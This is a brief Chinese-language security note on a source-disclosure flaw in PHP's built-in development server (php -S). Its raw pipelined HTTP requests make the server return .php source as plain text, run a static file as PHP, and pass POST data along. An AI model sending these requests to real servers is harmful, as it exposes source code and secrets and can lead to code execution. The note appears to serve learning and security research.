---
title: "PHP 杂项笔记"
pubDatetime: 2025-01-20T00:00:00.000+08:00
description: "PHP 源码泄露、配置特性与安全相关杂项记录"
tags: ["php"]
---
## php源码泄露
https://projectdiscovery.io/blog/php-http-server-source-disclosure

已知影响版本 5.4.45nts - 8.0.2nts （windows？）
网上说到7.4.21，应该是linux的范围

如果php -S 启动服务器，则可以泄露存在的php代码。
把php当做静态文件输出

```txt
GET /index.php HTTP/1.1
Host: localhost:8000

GET /xyz.xyz HTTP/1.1



```

同理可以把静态文件当做php执行

```txt
GET /index.txt HTTP/1.1
Host: localhost:8000

GET /1.php HTTP/1.1



```

如果要传递POST参数，两个都要是POST

```
POST /test.php.bak?a=2 HTTP/1.1
Host: localhost:8000
Content-Type: application/x-www-form-urlencoded
Content-Length: 3

a=1
POST /1.php HTTP/1.1
Host: localhost


```
